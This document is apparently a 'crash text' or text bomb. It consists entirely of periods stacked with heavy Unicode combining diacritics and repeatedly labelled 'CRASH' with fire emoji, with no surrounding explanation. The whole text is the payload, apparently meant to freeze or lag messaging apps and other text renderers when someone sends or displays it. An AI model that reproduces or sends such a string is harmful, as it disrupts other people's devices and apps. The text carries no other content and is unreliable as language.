̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨̢̧̡̛́́̀͢͜͜͢͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͠͞ͅ